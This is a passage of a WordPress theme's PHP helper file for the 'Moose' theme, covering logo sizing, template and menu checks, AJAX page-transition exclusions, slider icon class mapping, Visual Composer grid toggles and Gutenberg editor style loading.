			$moose_elated_options['logo_width'] = 280;
			$moose_elated_options['logo_height'] = 130;

			//is image width and height set?
			if(isset($logo_image_sizes['width']) && isset($logo_image_sizes['height'])) {
				//set those variables in global array
				$moose_elated_options['logo_width'] = $logo_image_sizes['width'];
				$moose_elated_options['logo_height'] = $logo_image_sizes['height'];
			}
		}

	}

	add_action('init', 'moose_elated_set_logo_sizes', 0);
}


if(!function_exists('moose_elated_is_default_wp_template')) {
	/**
	 * Function that checks if current page archive page, search, 404 or default home blog page
	 * @return bool
	 *
	 * @see is_archive()
	 * @see is_search()
	 * @see is_404()
	 * @see is_front_page()
	 * @see is_home()
	 */
	function moose_elated_is_default_wp_template() {
		return is_archive() || is_search() || is_404() || (is_front_page() && is_home());
	}
}

if(!function_exists('moose_elated_get_page_template_name')) {
	/**
	 * Returns current template file name without extension
	 * @return string name of current template file
	 */
	function moose_elated_get_page_template_name() {
		$file_name = '';

		if(!moose_elated_is_default_wp_template()) {
			$file_name_without_ext = preg_replace('/\\.[^.\\s]{3,4}$/', '', basename(get_page_template()));

			if($file_name_without_ext !== '') {
				$file_name = $file_name_without_ext;
			}
		}

		return $file_name;
	}
}

if(!function_exists('moose_elated_is_main_menu_set')) {
    /**
     * Function that checks if any of main menu locations are set.
     * Checks whether top-navigation location is set, or left-top-navigation and right-top-navigation is set
     * @return bool
     *
     * @version 0.1
     */
    function moose_elated_is_main_menu_set() {
        $has_top_nav = has_nav_menu('top-navigation');
        $has_divided_nav = has_nav_menu('left-top-navigation') && has_nav_menu('right-top-navigation');

        return $has_top_nav || $has_divided_nav;
    }
}

if(!function_exists('moose_elated_has_shortcode')) {
	/**
	 * Function that checks whether shortcode exists on current page / post
	 * @param string shortcode to find
	 * @param string content to check. If isn't passed current post content will be used
	 * @return bool whether content has shortcode or not
	 */
	function moose_elated_has_shortcode($shortcode, $content = '')
	{
		$has_shortcode = false;

		if ($shortcode) {
			//if content variable isn't past
			if ($content == '') {
				//take content from current post
				$page_id = moose_elated_get_page_id();
				if (!empty($page_id)) {
					$current_post = get_post($page_id);

					if (is_object($current_post) && property_exists($current_post, 'post_content')) {
						$content = $current_post->post_content;
					}

				}
			}

			//does content has shortcode added?
			if (stripos($content, '[' . $shortcode) !== false) {
				$has_shortcode = true;
			}
		}

		return $has_shortcode;
	}
}



if(!function_exists('moose_elated_localize_no_ajax_pages')) {
    /**
     * Function that outputs no_ajax_obj javascript variable that is used default_dynamic.php.
     * It is used for no ajax pages functionality
     *
     * Function hooks to wp_enqueue_scripts and uses wp_localize_script
     *
     * @see http://codex.wordpress.org/Function_Reference/wp_localize_script
     *
     * @uses eltd_get_posts_without_ajax()
     * @uses eltd_get_pages_without_ajax()
     * @uses moose_elated_get_wpml_pages_for_current_page()
     * @uses moose_elated_get_woocommerce_pages()
     *
     * @version 0.1
     */
    function moose_elated_localize_no_ajax_pages() {
	    $moose_elated_options = moose_elated_return_global_options();

        //is ajax enabled?
        if(moose_elated_is_ajax_enabled()) {
            $no_ajax_pages = array();

            //get posts that have ajax disabled and merge with main array
            $no_ajax_pages = array_merge($no_ajax_pages, moose_elated_get_objects_without_ajax());

            //is wpml installed?
            if(moose_elated_is_wpml_installed()) {
                //get translation pages for current page and merge with main array
                $no_ajax_pages = array_merge($no_ajax_pages, moose_elated_get_wpml_pages_for_current_page());
            }

            //is woocommerce installed?
            if(moose_elated_is_woocommerce_installed()) {
                //get all woocommerce pages and products and merge with main array
                $no_ajax_pages = array_merge($no_ajax_pages, moose_elated_get_woocommerce_pages());
            }

            //do we have some internal pages that won't to be without ajax?
            if (isset($moose_elated_options['internal_no_ajax_links'])) {
                //get array of those pages
                $options_no_ajax_pages_array = explode(',', $moose_elated_options['internal_no_ajax_links']);

                if(is_array($options_no_ajax_pages_array) && count($options_no_ajax_pages_array)) {
                    $no_ajax_pages = array_merge($no_ajax_pages, $options_no_ajax_pages_array);
                }
            }

            //add logout url to main array
            $no_ajax_pages[] = wp_specialchars_decode(wp_logout_url());

            //finally localize script so we can use it in default_dynamic
            wp_localize_script( 'moose-elated-default-dynamic', 'no_ajax_obj', array(
                'no_ajax_pages' => $no_ajax_pages
            ));
        }
    }

    add_action('wp_enqueue_scripts', 'moose_elated_localize_no_ajax_pages');
}

if(!function_exists('moose_elated_get_objects_without_ajax')) {
    /**
     * Function that returns urls of objects that have ajax disabled.
     * Works for posts, pages and portfolio pages.
     * @return array array of urls of posts that have ajax disabled
     *
     * @version 0.1
     */
    function moose_elated_get_objects_without_ajax() {
        $posts_without_ajax = array();

        $posts_args =  array(
            'post_type'  => array('post', 'portfolio_page', 'page'),
            'post_status' => 'publish',
            'meta_key' => 'eltd_show-animation',
            'meta_value' => 'no_animation'
        );

        $posts_query = new WP_Query($posts_args);

        if($posts_query->have_posts()) {
            while($posts_query->have_posts()) {
                $posts_query->the_post();
                $posts_without_ajax[] = get_permalink(get_the_ID());
            }
        }

        wp_reset_postdata();

        return $posts_without_ajax;
    }
}

if(!function_exists('moose_elated_is_ajax_enabled')) {
    /**
     * Function that checks if ajax is enabled.
     * @return bool
     *
     * @version 0.1
     */
    function moose_elated_is_ajax_enabled() {
	    $moose_elated_options = moose_elated_return_global_options();

        $has_ajax = false;

        if(isset($moose_elated_options['page_transitions']) && $moose_elated_options['page_transitions'] !== '0') {
            $has_ajax = true;
        }

        return $has_ajax;
    }
}

if(!function_exists('moose_elated_is_ajax_header_animation_enabled')) {
    /**
     * Function that checks if header animation with ajax is enabled.
     * @return boolean
     *
     * @version 0.1
     */
    function moose_elated_is_ajax_header_animation_enabled() {
	    $moose_elated_options = moose_elated_return_global_options();

        $has_header_animation = false;

        if(isset($moose_elated_options['page_transitions']) && $moose_elated_options['page_transitions'] !== '0' && isset($moose_elated_options['ajax_animate_header']) && $moose_elated_options['ajax_animate_header'] == 'yes') {
            $has_header_animation = true;
        }

        return $has_header_animation;
    }
}

if(!function_exists('moose_elated_horizontal_slider_icon_classes')) {
	/**
	 * Returns classes for left and right arrow for sliders
	 *
	 * @param $icon_class
	 * @return array
	 */
	function moose_elated_horizontal_slider_icon_classes($icon_class) {

		switch($icon_class) {
			case 'arrow_carrot-left_alt2':
				$left_icon_class = 'arrow_carrot-left_alt2';
				$right_icon_class = 'arrow_carrot-right_alt2';
				break;
			case 'arrow_carrot-2left_alt2':
				$left_icon_class = 'arrow_carrot-2left_alt2';
				$right_icon_class = 'arrow_carrot-2right_alt2';
				break;
			case 'arrow_triangle-left_alt2':
				$left_icon_class = 'arrow_triangle-left_alt2';
				$right_icon_class = 'arrow_triangle-right_alt2';
				break;
			case 'icon-arrows-drag-left-dashed':
				$left_icon_class = 'icon-arrows-drag-left-dashed';
				$right_icon_class = 'icon-arrows-drag-right-dashed';
				break;
			case 'icon-arrows-drag-left-dashed':
				$left_icon_class = 'icon-arrows-drag-left-dashed';
				$right_icon_class = 'icon-arrows-drag-right-dashed';
				break;
			case 'icon-arrows-left-double-32':
				$left_icon_class = 'icon-arrows-left-double-32';
				$right_icon_class = 'icon-arrows-right-double';
				break;
			case 'icon-arrows-slide-left1':
				$left_icon_class = 'icon-arrows-slide-left1';
				$right_icon_class = 'icon-arrows-slide-right1';
				break;
			case 'icon-arrows-slide-left2':
				$left_icon_class = 'icon-arrows-slide-left2';
				$right_icon_class = 'icon-arrows-slide-right2';
				break;
			case 'icon-arrows-slim-left-dashed':
				$left_icon_class = 'icon-arrows-slim-left-dashed';
				$right_icon_class = 'icon-arrows-slim-right-dashed';
				break;
			case 'ion-arrow-left-a':
				$left_icon_class = 'ion-arrow-left-a';
				$right_icon_class = 'ion-arrow-right-a';
				break;
			case 'ion-arrow-left-b':
				$left_icon_class = 'ion-arrow-left-b';
				$right_icon_class = 'ion-arrow-right-b';
				break;
			case 'ion-arrow-left-c':
				$left_icon_class = 'ion-arrow-left-c';
				$right_icon_class = 'ion-arrow-right-c';
				break;
			case 'ion-ios-arrow-':
				$left_icon_class = $icon_class.'back';
				$right_icon_class = $icon_class.'forward';
				break;
			case 'ion-ios-fastforward':
				$left_icon_class = 'ion-ios-rewind';
				$right_icon_class = 'ion-ios-fastforward';
				break;
			case 'ion-ios-fastforward-outline':
				$left_icon_class = 'ion-ios-rewind-outline';
				$right_icon_class = 'ion-ios-fastforward-outline';
				break;
			case 'ion-ios-skipbackward':
				$left_icon_class = 'ion-ios-skipbackward';
				$right_icon_class = 'ion-ios-skipforward';
				break;
			case 'ion-ios-skipbackward-outline':
				$left_icon_class = 'ion-ios-skipbackward-outline';
				$right_icon_class = 'ion-ios-skipforward-outline';
				break;
			case 'ion-android-arrow-':
				$left_icon_class = $icon_class.'back';
				$right_icon_class = $icon_class.'forward';
				break;
			case 'ion-android-arrow-dropleft-circle':
				$left_icon_class = 'ion-android-arrow-dropleft-circle';
				$right_icon_class = 'ion-android-arrow-dropright-circle';
				break;
			default:
				$left_icon_class = $icon_class.'left';
				$right_icon_class = $icon_class.'right';
		}

		$icon_classes = array(
			'left_icon_class' => $left_icon_class,
			'right_icon_class' => $right_icon_class
		);

    	return $icon_classes;

	}
}

if(!function_exists('moose_elated_rewrite_rules_on_theme_activation')) {
	/**
	 * Function that flushes rewrite rules on deactivation
	 */
	function moose_elated_rewrite_rules_on_theme_activation() {
		flush_rewrite_rules();
	}

	add_action( 'after_switch_theme', 'moose_elated_rewrite_rules_on_theme_activation' );
}

if (!function_exists('moose_elated_vc_grid_elements_enabled')) {

	/**
	 * Function that checks if Visual Composer Grid Elements are enabled
	 *
	 * @return bool
	 */
	function moose_elated_vc_grid_elements_enabled() {
		
		$moose_elated_options = moose_elated_return_global_options();
		$vc_grid_enabled = false;

		if (isset($moose_elated_options['enable_grid_elements']) && $moose_elated_options['enable_grid_elements'] == 'yes') {

			$vc_grid_enabled = true;

		}

		return $vc_grid_enabled;

	}

}

if(!function_exists('moose_elated_visual_composer_grid_elements')) {

	/**
	 * Removes Visual Composer Grid Elements post type if VC Grid option disabled
	 * and enables Visual Composer Grid Elements post type
	 * if VC Grid option enabled
	 */
	function moose_elated_visual_composer_grid_elements() {

		if(!moose_elated_vc_grid_elements_enabled()){

			remove_action( 'init', 'vc_grid_item_editor_create_post_type' );

		}
	}

	add_action('vc_after_init', 'moose_elated_visual_composer_grid_elements', 12);
}

if(!function_exists('moose_elated_grid_elements_ajax_disable')) {
	/**
	 * Function that disables ajax transitions if grid elements are enabled in theme options
	 */
	function moose_elated_grid_elements_ajax_disable() {
		$moose_elated_options = moose_elated_return_global_options();

		if(moose_elated_vc_grid_elements_enabled()) {
			$moose_elated_options['page_transitions'] = '0';
		}
	}

	add_action('wp', 'moose_elated_grid_elements_ajax_disable');
}


if(!function_exists('moose_elated_get_vc_version')) {
	/**
	 * Return Visual Composer version string
	 *
	 * @return bool|string
	 */
	function moose_elated_get_vc_version() {
		if(moose_elated_visual_composer_installed()) {
			return WPB_VC_VERSION;
		}

		return false;
	}
}



if ( ! function_exists( 'moose_elated_is_gutenberg_installed' ) ) {
	/**
	 * Function that checks if Gutenberg plugin installed
	 * @return bool
	 */
	function moose_elated_is_gutenberg_installed() {
		return function_exists( 'is_gutenberg_page' ) && is_gutenberg_page();
	}
}

if ( ! function_exists('moose_elated_is_wp_gutenberg_installed') ) {
	/**
	 * Function that checks if WordPress 5.x with Gutenberg editor installed
	 *
	 * @return bool
	 */
	function moose_elated_is_wp_gutenberg_installed() {
		return class_exists( 'WP_Block_Type' );
	}
}

if ( ! function_exists( 'moose_elated_is_cpt_installed' ) ) {
	/**
	 * Function that checks if Core plugin is installed
	 * @return bool
	 */
	function moose_elated_is_cpt_installed() {
		if(defined('ELATED_CPT_VERSION')) {
			return true;
		} else {
			return false;
		}
	}
}

if ( ! function_exists( 'moose_elated_enqueue_editor_customizer_styles' ) ) {
	/**
	 * Enqueue supplemental block editor styles
	 */
	function moose_elated_enqueue_editor_customizer_styles() {
		wp_enqueue_style( 'moose-editor-customizer-style', MOOSE_ELATED_ROOT . '/framework/admin/assets/css/editor-customizer-style.css' );
		wp_enqueue_style( 'moose-editor-blocks-style', MOOSE_ELATED_ROOT . '/`framework/admin/assets/css/editor-blocks-style.css' );
	}

	add_action( 'enqueue_block_editor_assets', 'moose_elated_enqueue_editor_customizer_styles' );
}
if ( ! function_exists( 'moose_elated_fix_for_is_gutenberg_installed' ) ) {
	/**
	 * Function that checks if Gutenberg plugin installed
	 */
	function moose_elated_fix_for_is_gutenberg_installed() {
		if ( function_exists( 'is_gutenberg_page' ) ) {
			if(is_admin()){
				wp_enqueue_style( 'gutenberg-fix', get_template_directory_uri() . '/css/gutenberg.css', array(), '1.0' );
			}
		}
	}
	add_action( 'admin_enqueue_scripts', 'moose_elated_fix_for_is_gutenberg_installed' );
}